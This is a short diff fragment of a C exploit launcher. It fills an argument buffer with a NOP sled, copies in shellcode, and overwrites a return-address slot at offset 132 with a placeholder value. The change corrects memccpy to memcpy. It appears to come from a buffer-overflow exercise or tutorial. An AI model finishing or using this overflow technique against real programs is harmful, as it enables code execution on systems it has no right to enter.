@@ -22,7 +22,7 @@ int main() {
     memset(args[1], 0x90, 136);
 
     args[1][136] = '\0';
-    memccpy(args[1], shellcode, strlen(shellcode));
+    memcpy(args[1], shellcode, strlen(shellcode));
 
     *(unsigned int *)(args[1] + 132) = 0x12345678;
 
